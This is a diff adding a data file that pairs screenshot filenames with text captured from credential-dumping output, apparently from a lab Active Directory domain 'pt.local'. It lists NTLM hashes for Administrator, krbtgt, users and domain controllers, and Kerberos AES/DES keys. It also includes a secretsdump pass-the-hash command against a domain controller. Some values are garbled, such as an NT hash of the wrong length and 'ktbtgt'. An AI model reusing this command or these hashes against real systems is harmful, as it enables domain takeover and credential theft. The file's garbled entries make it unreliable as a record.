@@ -1,0 +1,29 @@
+filename;words
+3-3.png;[*] Using the DRSUAPI method to get NTDS.DIT secrets
+3-4.png;Administrator:500:aad3b435b51404eeaad3b435b51404ee:de6889b4ffc33c22d4d21fb08caec275:::
+3-5.png;Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+3-6.png;krbtgt:502:aad3b435b51404eeaad3b435b51404ee:570850cc8fba32b0f00f3fd0092dfb43:::
+3-7.png;DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+3-8.png;pt.local\Alex:1107:aad3b435b51404eeaad3b435b51404ee:26315a1202e89184e083f804fb569941:::
+3-9.png;pt.local\Gleb:1108:aad3b435b51404eeaad3b435b51404ee:1b716ca85c3cc78be5489289870d326d:::
+3-10.png;pt.local\Petr:1109:aad3b435b51404eeaad3b435b51404ee:120943a1101014ab6c2c035b079f6e6d:::
+3-21.png;pt.local\Ada:1120:aad3b435b51404eeaad3b435b51404ee:26315a1202e89184e083f804fb569941:::
+3-22.png;pt.local\Roza:1121:aad3b435b51404eeaad3b435b51404ee:e6421b89f2b0418683010801655d7c79:::
+3-23.png;pt.local\Olga:1122:aad3b435b51404eeaad3b435b51404ee:ba4268d0fc89c686093c3946c3946c359f1b4:::
+3-24.png;pt.local\ADMPetr:1133:aad3b435b51404eeaad3b435b51404ee:05df2fd1109e3d3b60f110965f6af128:::
+3-25.png;pt.local\ADMIgor:1134:aad3b435b51404eeaad3b435b51404ee:05df2fd1109e3d3b60f110965f6af128:::
+3-26.png;DC1$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+3-27.png;DC2$:1105:aad3b435b51404eeaad3b435b51404ee:a50b272dee8d958d8fb1336f2ed23bf7:::
+3-28.png;PC1$:1106:aad3b435b51404eeaad3b435b51404ee:085c12700f5b6c499a001d20724f4d7e:::
+3-29.png;[*] Kerberos keys grabbed
+3-30.png;ktbtgt:aes256-cts-hmac-sha1-96:7a7ef6c20ae0eccdd11203a1fc24eda5c2e5b6a4ffbd3460b3ce4ced6775f43b
+3-40.png;pt.local\Petr:aes128-cts-hmac-sha1-96:d7dd3f8afddc66364f3cafc830b4f40b
+3-41.png;pt.local\Petr:des-cbc-md5:374a57d3ef9b97cb
+3-42.png;pt.local\Anton:aes256-cts-hmac-sha1-96:ce6aa06dbda62df999ebc5bb9dfe6bb4afafaae1ead7488ae05b29b94edf0495
+3-43.png;pt.local\Anton:aes128-cts-hmac-sha1-96:3cb62aeaf9b02ce588a77d13c9647f6e
+3-44.png;pt.local\Anton:des-cbc-md5:45195d1938a2e673
+3-45.png;pt.local\Igor:aes256-cts-hmac-sha1-96:9e7d219d456213a7ad3e4f112185fc3120c0f36cf4cee7363ab7108693de2b76
+3-47.png;pt.local\Igor:des-cbc-md5:f1b0f87ac27adf3b
+3-48.png;pt.local\Vasya:aes256-cts-hmac-sha1-96:37bc6e91086522e725d2e9e0f43c114355594e86584fc6318c75d6cd16755ae0
+3-49.png;# python3 secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'PT/DC1$@192.168.10.200
+3-56.png;pt.local\Igor:aes128-cts-hmac-sha1-96:6a55f9690c1bb265cb7349654f0b0204
